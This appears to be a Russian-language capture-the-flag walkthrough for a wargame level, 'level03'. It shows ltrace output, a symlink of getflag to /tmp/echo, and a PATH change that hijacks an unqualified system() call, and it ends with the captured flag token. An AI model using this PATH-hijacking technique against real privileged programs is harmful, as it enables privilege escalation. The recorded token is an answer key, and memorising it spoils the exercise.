@@ -1,0 +1,31 @@
+level03
+
+ls
+
+Запускаем ./level03
+Exploit me
+
+Для анализа вхождений функций запускаем через отладчик:
+ltrace ./level03
+
+В строке 
+system("usr/bin/env echo Exploit me"Exploit me
+<unfinished ...>
+видим, что эта программа вызывает echo
+
+вызывается бинарник echo, подмением его
+which getflag
+ln -s /bin/getflag /tmp/echo
+
+#Создадим и назовем наш файл echo (в папке tmp т.к там есть права)
+#echo "/bin/getflag" > /tmp/echo
+
+После изменим переменную среды добавив в начало:
+PATH=/tmp:$PATH
+
+./level03
+
+Получаем токен:
+qi0maab88jeaj46qoumi7maus
+
+Done!
